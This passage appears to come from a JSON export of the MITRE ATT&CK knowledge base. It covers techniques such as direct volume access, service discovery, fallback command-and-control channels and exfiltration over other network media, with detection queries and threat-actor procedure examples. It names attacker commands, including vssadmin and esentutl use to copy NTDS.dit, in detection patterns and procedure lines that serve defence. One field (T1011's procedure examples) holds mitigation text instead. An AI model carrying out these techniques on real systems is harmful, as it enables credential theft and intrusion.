      "Fox Kittenhas searched local system resources to access sensitive documents.[88]",
      "FrameworkPOScan collect elements related to credit card data from process memory.[89]",
      "DuringFrankenstein, the threat actors usedEmpireto gather various local system information.[90]",
      "FunnyDreamcan upload files from victims' machines.[41][91]",
      "GALLIUMcollected data from the victim's local system, including password hashes from the SAM hive in the Registry.[92]",
      "Gamaredon Grouphas collected files from infected systems and uploaded them to a C2 server.[93]",
      "Gelsemiumcan collect data from a compromised host.[48]",
      "Goopyhas the ability to exfiltrate documents from infected systems.[94]",
      "GravityRATsteals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.[95]",
      "Green Lambertcan collect data from a compromised host.[96]",
      "GrimAgentcan collect data and files from a compromised host.[97]",
      "HAFNIUMhas collected data and files from a compromised machine.[47][98]",
      "Hikitcan upload files from compromised machines.[21]",
      "Hydraqcreates a backdoor through which remote attackers can read data from files.[99][100]",
      "IceApplecan collect files, passwords, and other data from a compromised host.[101]",
      "Inceptionused a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.[102]",
      "InvisiMolecan collect data from the system, and can monitor changes in specified directories.[103]",
      "IPsec Helpercan identify specific files and folders for follow-on exfiltration.[104]",
      "Ixeshecan collect data from a local system.[105]",
      "Kazuaruploads files from a specified directory to the C2 server.[106]",
      "Ke3changgathered information and files from local directories for exfiltration.[107][108]",
      "Kevincan upload logs and other data from a compromised host.[109]",
      "KGH_SPYcan send a file containing victim system information to C2.[110]",
      "Kimsukyhas collected Office, PDF, and HWP documents from its victims.[111][112]",
      "Koadiccan download files off the target system to send back to the server.[113][114]",
      "KONNIhas stored collected information and discovered processes in a tmp file.[115]",
      "KOPILUWAKcan gather information from compromised hosts.[38]",
      "LAPSUS$uploaded sensitive files, information, and credentials from a targeted organization for extortion or public release.[116]",
      "Latrodectuscan collect data from a compromised host using a stealer module.[117]",
      "Lazarus Grouphas collected data and files from compromised networks.[118][119][120][121]",
      "LightNeuroncan collect files from a local system.[122]",
      "Linfocreates a backdoor through which remote attackers can obtain data from local systems.[123]",
      "LoFiSecan collect files of interest from targeted systems.[124]",
      "LuminousMothhas collected files and data from compromised machines.[125][126]",
      "Machetesearches the File system for files of interest.[127]",
      "MacMacan collect then exfiltrate files from the compromised system.[128]",
      "Mafaldacan collect files and information from a compromised host.[129]",
      "Magic Houndhas used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine.[130][131]",
      "MarkiRATcan upload data from the victim's machine to the C2 server.[132]",
      "MCMDhas the ability to upload files from an infected device.[133]",
      "menuPasshas collected various files from the compromised computers.[134][135]",
      "metaMaincan collect files and system information from a compromised host.[129][136]",
      "MgBotincludes modules for collecting files from local systems based on a given set of properties and filenames.[137]",
      "Milancan upload files from a compromised host.[138]",
      "Mis-Typehas collected files and data from a compromised host.[139]",
      "Misdathas collected files and data from a compromised host.[139]",
      "MobileOrderexfiltrates data collected from the victim mobile device.[140]",
      "Mongallhas the ability to upload files from victim's machines.[141]",
      "Nebulaehas the capability to upload collected files to C2.[142]",
      "Neoichorcan upload files from a victim's machine.[108]",
      "DuringNight Dragon, the threat actors collected files and other data from compromised systems.[143]",
      "NightClubcan use a file monitor to steal specific files from targeted systems.[144]",
      "njRATcan collect data from a local system.[145]",
      "NPPSPYrecords data entered from the local system logon at Winlogon to capture credentials in cleartext.[146]",
      "Octopuscan exfiltrate files from the system using a documents collector tool.[147]",
      "OilRighas used PowerShell to upload files from compromised systems.[148]",
      "DuringOperation CuckooBees, the threat actors collected data, files, and other information from compromised networks.[149]",
      "DuringOperation Dream Job,Lazarus Groupused malicious Trojans and DLL files to exfiltrate data from an infected host.[69][150]",
      "DuringOperation Honeybee, the threat actors collected data from compromised hosts.[151]",
      "DuringOperation MidnightEclipse, threat actors stole saved cookies and login data from targeted systems.[152]",
      "DuringOperation Wocao, threat actors exfiltrated files and directories of interest from the targeted system.[153]",
      "OSX_OCEANLOTUS.Dhas the ability to upload files from a compromised host.[154]",
      "Out1can copy files and Registry data from compromised hosts.[155]",
      "OutSteelcan collect information from a compromised host.[156]",
      "P.A.S. Webshellhas the ability to copy files on a compromised host.[157]",
      "Pasamcreates a backdoor through which remote attackers can retrieve files.[158]",
      "Patchworkcollected and exfiltrated files from the infected system.[159]",
      "Pcextercan upload files from targeted systems.[124]",
      "PcSharecan collect files and information from a compromised host.[41]",
      "Pillowminthas collected credit card data using native API functions.[160]",
      "PinchDukecollects user files from the compromised host based on predefined file extensions.[161]",
      "PingPullcan collect data from a compromised host.[162]",
      "PoisonIvycreates a backdoor through which remote attackers can steal system information.[163]",
      "PowerLesshas the ability to exfiltrate data, including Chrome and Edge browser database files, from compromised machines.[164]",
      "PowerSploitcontains a collection of Exfiltration modules that can access data from local files, volumes, and processes.[165][166]",
      "POWERSTATScan upload files from compromised hosts.[167]",
      "Proxysvcsearches the local system and gathers data.[168]",
      "PUNCHTRACKscrapes memory for properly formatted payment card data.[169][170]",
      "QakBotcan use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.[171][172]",
      "QuasarRATcan retrieve files from compromised client machines.[173]",
      "QuietSievecan collect files from a compromised host.[174]",
      "Raccoon Stealercollects data from victim machines based on configuration information received from command and control nodes.[175][176]",
      "RainyDaycan use a file exfiltration tool to collect recently changed files on a compromised host.[142]",
      "Ramsaycan collect Microsoft Word documents from the target's file system, as well as.txt,.doc, and.xlsfiles from the Internet Explorer cache.[177][178]",
      "RAPIDPULSEretrieves files from the victim system via encrypted commands sent to the web shell.[179]",
      "RawPOSdumps memory from specific processes on a victim system, parses the dumped files, and scrapes them for credit card data.[180][181][182]",
      "RCSessioncan collect data from a compromised host.[183][49]",
      "RedCurlhas collected data from the local disk of compromised hosts.[184][185]",
      "Rising Sunhas collected data and files from a compromised host.[186]",
      "ROKRATcan collect host data and specific file types.[187][188][189]",
      "Roversearches for files on local drives based on a predefined list of file extensions.[190]",
      "Saint Botcan collect files and information from a compromised host.[191]",
      "Samuraican leverage an exfiltration module to download arbitrary files from compromised machines.[192]",
      "Sandworm Teamhas exfiltrated internal documents, files, and other data from compromised hosts.[193]",
      "Sardonichas the ability to collect data from a compromised machine to deliver to the attacker.[194]",
      "SDBbothas the ability to access the file system on a compromised host.[195]",
      "Sharkcan upload files to its C2.[138][196]",
      "SharpDiscohas dropped a recent-files stealer plugin toC:\\Users\\Public\\WinSrcNT\\It11.exe.[144]",
      "ShimRathas the capability to upload collected files to a C2.[197]",
      "SideTwisthas the ability to upload files from a compromised host.[198]",
      "SLIGHTPULSEcan read files specified on the local system.[199]",
      "SLOTHFULMEDIAhas uploaded files and information from victim machines.[200]",
      "During theSolarWinds Compromise,APT29extracted files from compromised networks.[201]",
      "SombRAThas collected data and files from a compromised host.[54][202]",
      "SpicyOmelettehas collected data and other information from a compromised host.[203]",
      "STARWHALEcan collect data from an infected local host.[204]",
      "StealBitcan upload data and files to the LockBit victim-shaming site.[205][206]",
      "Stealth Falconmalware gathers data from the local victim system.[207]",
      "StrifeWatercan collect data from a compromised host.[208]",
      "SUNBURSTcollected information from a compromised host.[209][210]",
      "SVCReadycan collect data from an infected host.[211]",
      "SysUpdatecan collect information and files from a compromised host.[212]",
      "Taidoorcan upload data and files from a victim's machine.[213]",
      "TajMahalhas the ability to steal documents from the local system including the print spooler queue.[214]",
      "Threat Group-3390ran a command to compile an archive of file types of interest from the victim user's directories.[215]",
      "ThreatNeedlecan collect data and files from a compromised host.[121]",
      "TinyTurlacan upload files from a compromised host.[216]",
      "ToddyCathas run scripts to collect documents from targeted hosts.[124]",
      "Tomirishas the ability to collect recent files matching a hardcoded list of extensions prior to exfiltration.[217]",
      "TrickBotcollects local files and information from the victim’s local machine.[218]",
      "Troll Stealergathers information from infected systems such as SSH information from the victim's.sshdirectory.[219]Troll Stealercollects information from local FileZilla installations and Microsoft Sticky Note.[220]",
      "TurlaRPC backdoors can upload files from victim machines.[221]",
      "Uroburoscan use itsGetcommand to exfiltrate specified files from the compromised system.[222]",
      "Ursnifhas collected files from victim machines, including certificates and cookies.[223]",
      "USBferrycan collect information from an air-gapped host machine.[224]",
      "Volt Typhoonhas stolen files from a sensitive file server and the Active Directory database from targeted environments, and usedWevtutilto extract event log information.[225][226][227]",
      "WarzoneRATcan collect data from a compromised host.[228]",
      "WellMailcan exfiltrate files from the victim machine.[229]",
      "WellMesscan send files from the victim machine to C2.[230][231]",
      "Wevtutilcan be used to export events from a specific log.[232][233]",
      "Windigohas used a script to gather credentials in files left on disk by OpenSSH backdoors.[234]",
      "Wizard Spiderhas collected data from a compromised host prior to exfiltration.[235]",
      "Woody RATcan collect information from a compromised host.[236]",
      "xCaonhas uploaded files from victims' machines.[32]",
      "XCSSETcollects contacts and application data from files in Desktop, Documents, Downloads, Dropbox, and WeChat folders.[237]",
      "ytycollects files with the following extensions: .ppt, .pptx, .pdf, .doc, .docx, .xls, .xlsx, .docm, .rtf, .inp, .xlsm, .csv, .odt, .pps, .vcf and sends them back to the C2 server.[238]",
      "Zoxhas the ability to upload files from a targeted system.[21]",
      "ZxShellcan transfer files from a compromised host.[239]",
      "ZxxZcan collect data from a compromised host.[240]"
    ]
  },
  "T1006": {
    "Name": "Direct Volume Access",
    "Description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools.[1]Utilities, such asNinjaCopy, exist to perform these actions in PowerShell.[2]Adversaries may also use built-in or third-party utilities (such asvssadmin,wbadmin, andesentutl) to create shadow copies or backups of data from system volumes.[3]",
    "Detects": [
      "Monitor executed commands and arguments that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used throughPowerShell, additional logging of PowerShell scripts is recommended.",
      "Monitor handle opens on volumes that are made by processes to determine when they may be directly collecting data from logical drives.[2]",
      "Monitor for the creation of volume shadow copy and backup files, especially unexpected and irregular activity (relative to time, user, etc.)."
    ],
    "Procedure Examples": [
      "DuringAPT28 Nearest Neighbor Campaign,APT28accessed volume shadow copies through executingvssadminin order to dump the NTDS.dit file.[4]",
      "esentutlcan use the Volume Shadow Copy service to copy locked files such asntds.dit.[3][5]",
      "Scattered Spiderhas created volume shadow copies of virtual domain controller disks to extract theNTDS.ditfile.[6]",
      "Volt Typhoonhas executed the Windows-nativevssadmincommand to create volume shadow copies.[7]"
    ]
  },
  "T1007": {
    "Name": "System Service Discovery",
    "Description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such assc query,tasklist /svc,systemctl --type=service, andnet start.Adversaries may use the information fromSystem Service Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "Detects": [
      "Monitor executed commands and arguments that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such asWindows Management InstrumentationandPowerShell.",
      "Monitor for API calls associated with gathering information about registered local system services, such as QueryServiceStatusEx. Other Windows API calls worth monitoring include EnumServicesStatusExA, which can be used to enumerate services in the service control manager database.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary.",
      "Monitor for newly executed processes with arguments that may try to get information about registered services. System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). For event id 4688, depending on Windows version, you might need to enableAdministrative Templates\\System\\Audit Process Creation\\Include command line in process creation eventsgroup policy to include command line in process creation events.Analytic 1 -  Suspicious Processes((sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") OR (sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") | WHERE ((CommandLine LIKE \"%sc%\" AND CommandLine LIKE \"%query%\") OR    (CommandLine LIKE \"%tasklist%\" AND CommandLine LIKE \"%/svc%\") OR   (CommandLine LIKE \"%systemctl%\" AND CommandLine LIKE \"%--type=service%\") OR   (CommandLine LIKE \"%net%\" AND CommandLine LIKE \"%start%\"))"
    ],
    "Procedure Examples": [
      "admin@338actors used the following command following exploitation of a machine withLOWBALLmalware to obtain information about services:net start >> %temp%\\download[1]",
      "APT1used the commandsnet startandtasklistto get a listing of the services on the system.[2]",
      "Aquatic Pandahas attempted to discover services for third party EDR products.[3]",
      "Babukcan enumerate all services running on a compromised host.[4]",
      "BBSRATcan query service configuration information.[5]",
      "BitPaymercan enumerate existing Windows services on the host that are configured to run as LocalSystem.[6]",
      "Black Bastacan check whether the service nameFAXis present.[7]",
      "BRONZE BUTLERhas used TROJ_GETVERSION to discover system services.[8]",
      "Caterpillar WebShellcan obtain a list of the services from a system.[9]",
      "Chimerahas usednet startandnet usefor system service discovery.[10]",
      "Cobalt Strikecan enumerate services on compromised hosts.[11]",
      "Comnieruns the command:net start >> %TEMP%\\info.daton a victim.[12]",
      "Cubacan query service status usingQueryServiceStatusExfunction.[13]",
      "DarkTortillacan retrieve information about a compromised system's running services.[14]",
      "Dyrehas the ability to identify running services on a compromised host.[15]",
      "Earth Luscahas usedTasklistto obtain information from a compromised host.[16]",
      "Eliseexecutesnet startafter initial communication is made to the remote server.[17]",
      "Emissaryhas the capability to execute the commandnet startto interact with services.[18]",
      "Epicuses thetasklist /svccommand to list the services on the system.[19]",
      "GeminiDukecollects information on programs and services on the victim that are configured to automatically run at startup.[20]",
      "GravityRAThas a feature to list the available services on the system.[21]",
      "GreyEnergyenumerates all Windows services.[22]",
      "Heyoka Backdoorcan check if it is running as a service on a compromised host.[23]",
      "HotCroissanthas the ability to retrieve a list of services on the infected host.[24]",
      "Hydraqcreates a backdoor through which remote attackers can monitor services.[25][26]",
      "HyperBrocan list all services and their configurations.[27]",
      "Indrik Spiderhas used the win32_service WMI class to retrieve a list of services from the system.[28]",
      "InvisiMolecan obtain running services on the victim.[29]",
      "Ixeshecan list running services.[30]",
      "JPINcan list running services.[31]",
      "jRATcan list local services.[32]",
      "Ke3changperforms service discovery usingnet startcommands.[33]",
      "Kimsukyhas used an instrumentor script to gather the names of all services running on a victim's system.[34]",
      "Kwampirscollects a list of running services with the commandtasklist /svc.[35]",
      "LookBackcan enumerate services on the victim machine.[36]",
      "Thenet startcommand can be used inNetto find information about Windows services.[37]",
      "OilRighas usedsc queryon a victim to gather information about services.[38]",
      "DuringOperation CuckooBees, the threat actors used thenet startcommand as part of their initial reconnaissance.[39]",
      "DuringOperation Wocao, threat actors used thetasklistcommand to search for one of its backdoors.[40]",
      "After compromising a victim,Poseidon Groupdiscovers all running services.[41]",
      "PoshC2can enumerate service and service permission information.[42]",
      "RainyDaycan create and register a service for execution.[43]",
      "RATANKBAusestasklist /svcto display running tasks.[44]",
      "REvilcan enumerate active services.[45]",
      "S-Typeruns the commandnet starton a victim.[46]",
      "Sardonichas the ability to execute thenet startcommand.[47]",
      "SILENTTRINITYcan search for modifiable services that could be used for privilege escalation.[48]",
      "SLOTHFULMEDIAhas the capability to enumerate services.[49]",
      "SombRATcan enumerate services on a victim machine.[50]",
      "SUNBURSTcollected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.[51]",
      "Sykipotmay usenet startto display running services.[52]",
      "SynAckenumerates all running services.[53][54]",
      "SysUpdatecan collect a list of services on a victim machine.[55]",
      "Tasklistcan be used to discover services running on a system.[56]",
      "TeamTNThas searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them.[57]",
      "TrickBotcollects a list of install programs and services on the system’s machine.[58]",
      "Turlasurveys a system upon check-in to discover running services and associated processes using thetasklist /svccommand.[19]",
      "Ursnifhas gathered information about running services.[59]",
      "Volgmerqueries the system to identify existing services.[60]",
      "Volt Typhoonhas usednet startto list running services.[61]",
      "WINERACKcan enumerate services.[62]",
      "ZLibhas the ability to discover and manipulate Windows services.[46]",
      "ZxShellcan check the services on the system.[63]"
    ]
  },
  "T1008": {
    "Name": "Fallback Channels",
    "Description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
    "Detects": [
      "Monitor for newly constructed network connections that may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds. Processes utilizing the network that do not normally have network communication or have never been seen before may be suspicious.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on TCP network connection creation. The below analytic is using an event ID from OSQuery.",
      "Monitor network data for uncommon data flows, such as unexpected surges or other abnormal inbound/outbound patterns."
    ],
    "Procedure Examples": [
      "Anchorcan use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.[1]",
      "AppleSeedcan use a second channel for C2 when the primary channel is in upload mode.[2]",
      "APT41used the Steam community page as a fallback mechanism for C2.[3]",
      "Bazarhas the ability to use an alternative C2 server if the primary server fails.[4]",
      "BISCUITmalware contains a secondary fallback command and control server that is contacted after the primary command and control server.[5][6]",
      "BlackEnergyhas the capability to communicate over a backup channel via plus.google.com.[7]",
      "Bumblebeecan use backup C2 servers if the primary server fails.[8]",
      "Cardinal RATcan communicate over multiple C2 host and port combinations.[9]",
      "CharmPowercan change its C2 channel once every 360 loops by retrieving a new domain from the actors’ S3 bucket.[10]",
      "CHOPSTICKcan switch to a new C2 channel if the current one is broken.[11]",
      "Crutchhas used a hardcoded GitHub repository as a fallback channel.[12]",
      "Derusbiuses a backup communication method with an HTTP beacon.[13]",
      "DustySkyhas two hard-coded domains for C2 servers; if the first does not respond, it will try the second.[14]",
      "Eburyhas implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days.[15]",
      "Exaramel for Linuxcan attempt to find a new C2 server if it receives an error.[16]",
      "FatDukehas used several C2 servers per targeted organization.[17]",
      "FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.[18]",
      "Gelsemiumcan use multiple domains and protocols in C2.[19]",
      "HOPLIGHThas multiple C2 channels in place in case one fails.[20]",
      "InvisiMolehas been configured with several servers available for alternate C2 communications.[21][22]",
      "JHUHUGITtests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.[23]",
      "Kazuarcan accept multiple URLs for C2 servers.[24]",
      "Kevincan assign hard-coded fallback domains for C2.[25]",
      "Kwampirsuses a large list of C2 servers that it cycles through until a successful connection is established.[26]",
      "Lazarus Groupmalware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.[27][28]",
      "Linfocreates a backdoor through which remote attackers can change C2 servers.[29]",
      "Machetehas sent data over HTTP if FTP failed, and has also used a fallback server.[30]",
      "MiniDukeuses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.[31]",
      "Mis-Typefirst attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.[32]",
      "Mythiccan use a list of C2 URLs as fallback mechanisms in case one IP or domain gets blocked.[33]",
      "NETEAGLEwill attempt to detect if the infected host is configured to a proxy. If so,NETEAGLEwill send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.[34]",
      "DuringNight Dragon, threat actors used company extranet servers as secondary C2 servers.[35]",
      "OilBoostercan use a backup channel to request a new refresh token from its C2 server after 10 consecutive unsuccessful connections to the primary OneDrive C2 server.[36]",
      "OilRigmalware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.[37]",
      "PipeMoncan switch to an alternate C2 domain when a particular date has been reached.[38]",
      "QUADAGENTuses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.[39]",
      "QUIETEXITcan attempt to connect to a second hard-coded C2 if the first hard-coded C2 address fails.[40]",
      "RainyDayhas the ability to switch between TCP and HTTP for C2 if one method is not working.[41]",
      "RDAThas used HTTP if DNS C2 communications were not functioning.[42]",
      "S-Typeprimarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.[32]",
      "Sharkcan update its configuration to use a different C2 server.[43]",
      "ShimRathas used a secondary C2 location if the first was unavailable.[44]",
      "SideTwisthas primarily used port 443 for C2 but can use port 80 as a fallback.[45]",
      "SslMMhas a hard-coded primary and backup C2 string.[46]",
      "Stuxnethas the ability to generate new C2 domains.[47]",
      "TAINTEDSCRIBEcan randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails, it will wait 60 seconds and then try another IP address.[48]",
      "TinyTurlacan go through a list of C2 server IPs and will try to register with each until one responds.[49]",
      "TrickBotcan use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.[1]",
      "Uroburoscan use up to 10 channels to communicate between implants.[50]",
      "Valakcan communicate over multiple C2 hosts.[51]",
      "WinMMis usually configured with primary and backup domains for C2 communications.[46]",
      "The C2 server used byXTunnelprovides a port number to the victim to use as a fallback in case the connection closes on the currently used port.[11]"
    ]
  },
  "T1010": {
    "Name": "Application Window Discovery",
    "Description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.[1]For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.[2]Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such asCommand and Scripting Interpretercommands andNative APIfunctions.",
    "Detects": [
      "Monitor executed commands and arguments for actions that could be taken to gather system and network information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.Note: Commands can also be obtained from Payload event field for PowerShell event id 4103. For PowerShell Module logging event id 4103, enable logging for module Microsoft.PowerShell.Management.Analytic 1 - Suspicious Commandssourcetype=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=\"4103\" | where CommandLine LIKE \"%Get-Process%\" AND CommandLine LIKE \"%mainWindowTitle%\"",
      "Monitor for API calls (such asGetForegroundWindow()) that may attempt to get a listing of open application windows.GetForegroundWindowapi returns a handle to the foreground window (the window with which the user is currently working). Other API calls relevant to Local Group discovery includeGetProcessesandGetForegroundWindow.GetProcessesapi returns an array of type Process that represents all the process resources running on the local computer.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary.",
      "Monitor for newly executed processes that may attempt to get a listing of open application windows. System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created).Analytic 1 - Suspicious Processes(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") | where CommandLine LIKE \"%Get-Process%\" AND CommandLine LIKE \"%mainWindowTitle%\""
    ],
    "Procedure Examples": [
      "Aria-bodyhas the ability to identify the titles of running windows on a compromised host.[3]",
      "Attorcan obtain application window titles and then determines which windows to perform Screen Capture on.[4]",
      "Cadelspyhas the ability to identify open windows on the compromised host.[5]",
      "Catchamasobtains application windows titles and then determines which windows to performScreen Captureon.[6]",
      "DarkGatewill search for cryptocurrency wallets by examining application window names for specific strings.[7]DarkGateextracts information collected via NirSoft tools from the hosting process's memory by first identifying the window through theFindWindowAPI function.[7]",
      "DarkWatchmanreports window names along with keylogger information to provide application context.[1]",
      "The discovery modules used withDuqucan collect information on open windows.[8]",
      "DUSTTRAPcan enumerate running application windows.[9]",
      "Flagprocan check the name of the window displayed on the system.[10]",
      "FunnyDreamhas the ability to discover application windows via execution ofEnumWindows.[11]",
      "Grandoreirocan identify installed security tools based on window names.[2]",
      "HEXANEhas used a PowerShell-based keylogging tool to capture the window title.[12]",
      "HotCroissanthas the ability to list the names of all open windows on the infected host.[13]",
      "InvisiMolecan enumerate windows and child windows on a compromised host.[14][15]",
      "Kazuargathers information about opened windows.[16]",
      "Lazarus Groupmalware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.[17][18][19]",
      "Machetesaves the window names.[20]",
      "Metamorfocan enumerate all windows on the victim’s machine.[21][22]",
      "NetTravelerreports window names along with keylogger information to provide application context.[23]",
      "NETWIREcan discover and close windows on controlled systems.[24]",
      "NightClubcan useGetForegroundWindowto enumerate the active window.[25]",
      "njRATgathers information about opened windows during the initial infection.[26]",
      "PLEADhas the ability to list open windows on the compromised host.[27][27]",
      "PoisonIvycaptures window titles.[28]",
      "PowerDukehas a command to get text of the current foreground window.[29]",
      "QakBothas the ability to enumerate windows on a compromised host.[30]",
      "Remexihas a command to capture active windows on the machine and retrieve window titles.[31]",
      "ROKRATcan use  theGetForegroundWindowandGetWindowTextAPIs to discover where the user is typing.[32]",
      "SILENTTRINITYcan enumerate the active Window during keylogging through execution ofGetActiveWindowTitle.[33]",
      "SOUNDBITEis capable of enumerating application windows.[34]",
      "Trojan.Karaganycan monitor the titles of open windows to identify specific keywords.[35]",
      "Volt Typhoonhas collected window title information from compromised systems.[36]",
      "WINERACKcan enumerate active windows.[37]"
    ]
  },
  "T1011": {
    "Name": "Exfiltration Over Other Network Medium",
    "Description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "Detects": [
      "Monitor commands that enable alternate network interfaces (WiFi, Bluetooth, cellular), execution of utilities such as nmcli, netsh, or iwconfig that modify network settings, or unusual command-line activity related to USB tethering or VPN activation.Analytic 1 - Detecting Alternate Network Activation Commands(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"nmcli radio wifi on\", \"rfkill unblock all\", \"netsh wlan connect\", \"ifconfig wlan0 up\", \"pppd call\"))| eval risk_score=case(    command IN (\"nmcli radio wifi on\", \"netsh wlan connect\"), 9,    command IN (\"rfkill unblock all\", \"ifconfig wlan0 up\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
      "Monitor for access to sensitive files before potential exfiltration, files being staged in locations accessible to alternate networks, or usage of USB storage, external disks, or wireless file transfer.Analytic 1 - Detecting File Access Before Alternate Network Exfiltration(EventCode=11 OR EventCode=4663 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_path IN (\"/media/usb/\", \"/mnt/usb/\", \"/var/tmp/exfil/\", \"C:\\Users\\\\Documents\\exfil\"))| eval risk_score=case(    file_path IN (\"/media/usb/\", \"/mnt/usb/\"), 9,    file_path IN (\"/var/tmp/exfil/*\"), 8)| where risk_score >= 8| stats count by _time, host, user, file_path, risk_score",
      "Monitor for newly constructed network connections that may attempt to exfiltrate data over a different network medium than the command and control channel. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on TCP network connection creation. The below analytic is using an event ID from OSQuery.Analytic 1 - Detecting Exfiltration via Alternate Network Connections(EventCode=3 OR EventCode=10400)OR (source=\"zeek_conn.log\" interface IN (\"wlan0\", \"ppp0\", \"bt0\", \"usb0\"))| eval risk_score=case(    interface IN (\"wlan0\", \"usb0\"), 9,    interface IN (\"ppp0\", \"bt0\"), 8)| where risk_score >= 8| stats count by _time, host, user, interface, dest_ip, risk_score",
      "Monitor high-volume data transfers over secondary network connections, outbound SSH/SFTP connections over unauthorized networks, or anomalous encryption methods used for data exfiltration.Analytic 1 - Detecting Large Data Exfiltration via Alternate Network(EventCode=3)OR (source=\"zeek_conn.log\" dest_port IN (22, 443, 53) AND bytes_out > 5000000)OR (source=\"firewall_logs\" bytes_out > 10000000)| eval risk_score=case(    bytes_out > 10000000, 9,    bytes_out > 5000000, 8)| where risk_score >= 8| stats count by _time, host, user, dest_ip, dest_port, bytes_out, risk_score",
      "Monitor network data for uncommon data flows., such as the usage of abnormal/unexpected protocols."
    ],
    "Procedure Examples": [
      "Disable WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel in local computer security settings or by group policy if it is not needed within an environment.",
      "Prevent the creation of new network adapters where possible.[1][2]"
    ]
  },
  "T1011.001": {
    "Name": "Exfiltration Over Other Network Medium:Exfiltration Over Bluetooth",
    "Description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "Detects": [
      "Monitor commands enabling Bluetooth interfaces (rfkill unblock bluetooth, btmgmt power on), execution of Bluetooth file transfer utilities (bluetoothctl, l2ping, hcitool).Analytic 1 - Detecting Bluetooth Activation Commands(EventCode=1 OR source=\"/var/log/audit/audit.log\" type=\"execve\")| where (command IN (\"rfkill unblock bluetooth\", \"bluetoothctl power on\", \"btmgmt power on\", \"hciconfig hci0 up\"))| eval risk_score=case(    command IN (\"rfkill unblock bluetooth\", \"btmgmt power on\"), 9,    command IN (\"bluetoothctl power on\", \"hciconfig hci0 up\"), 8)| where risk_score >= 8| stats count by _time, host, user, command, risk_score",
